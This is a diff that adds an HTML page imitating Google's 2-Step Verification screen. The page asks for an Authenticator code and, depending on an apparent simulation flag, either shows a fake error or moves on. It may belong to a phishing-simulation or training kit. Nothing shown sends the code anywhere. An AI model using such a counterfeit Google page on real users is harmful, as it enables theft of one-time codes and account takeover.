@@ -1,0 +1,16 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Sign in - Google Accounts</title><script src="common.js"></script></head>
+<body>
+<h1>2-Step Verification</h1>
+<p>To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
+<p>Get a verification code from the <b>Google Authenticator</b> app</p>
+<input type="tel" name="totpPin" id="totpPin" aria-label="Enter code" placeholder="Enter code">
+<div id="err" style="display:none;color:red"></div>
+<button id="next">Next</button>
+<button id="another">Try another way</button>
+<script>
+document.getElementById("next").onclick = () => {
+  const v = document.getElementById("totpPin").value.trim();
+  if (MODE === "badtotp" || !/^\d{6}$/.test(v)) return showError("err", "Wrong code. Try again.");
+  go("skip.html");
+};
+</script></body></html>
